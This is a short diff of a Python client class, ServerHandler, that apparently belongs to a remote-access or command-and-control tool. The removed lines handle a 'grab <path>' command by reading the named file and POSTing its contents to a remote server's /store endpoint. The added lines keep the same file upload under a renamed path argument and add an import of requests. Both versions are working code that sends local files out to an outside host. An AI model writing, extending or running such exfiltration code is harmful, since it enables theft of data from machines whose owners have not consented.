@@ -2,6 +2,7 @@ from urllib import request, parse
 import subprocess
 import time
 import os
+import requests
 
 
 
@@ -28,20 +29,14 @@ class ServerHandler:
         request.urlopen(req) # send request
 
 
-    def send_file(self, command):
-        try:
-            grab, path = command.strip().split(' ')
-        except ValueError:
-            self.send_post("[-] Invalid grab command (maybe multiple spaces)")
-            return
+    def send_file(self, image_file_path):
 
-        if not os.path.exists(path):
+        if not os.path.exists(image_file_path):
             self.send_post("[-] Not able to find the file")
             return
 
-        store_url = f'http://{self.ip}:{self.port}/store' # Posts to /store
-        with open(path, 'rb') as fp:
-            self.send_post(fp.read(), url=store_url)
+        with open(image_file_path, 'rb') as fp:
+            self.send_post(fp.read())
 
 
     def send_data(self, data):
